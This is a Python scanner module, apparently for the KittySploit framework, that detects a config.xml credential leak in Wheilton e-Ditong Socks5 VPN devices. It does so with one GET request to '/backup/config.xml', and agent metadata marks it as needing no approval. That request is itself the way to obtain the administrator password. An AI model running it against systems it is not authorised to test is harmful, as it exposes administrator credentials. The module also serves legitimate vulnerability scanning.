#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Information Leakage in the Socks5 VPN login system of Wheilton e-Ditong, and the administrator account passwor."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Socks5 VPN - Sensitive File Disclosure Detection',
        'description': 'Information Leakage in the Socks5 VPN login system of Wheilton e-Ditong, and the administrator account password can be obtained by visiting a specially crafted URL.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'exposure', 'esocks5', 'misconfig', 'files', 'disclosure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E6%83%A0%E5%B0%94%E9%A1%BF%20e%E5%9C%B0%E9%80%9A%20config.xml%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md',
            'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/%E6%83%A0%E5%B0%94%E9%A1%BF/%E6%83%A0%E5%B0%94%E9%A1%BF%20e%E5%9C%B0%E9%80%9A%20config.xml%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md?plain=1',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/backup/config.xml', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<config>', 'password=', 'username=',)
        header_any = ('application/xml',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Socks5 VPN - Sensitive File Disclosure detected",
                path='/backup/config.xml',
            )
            return True
        return False

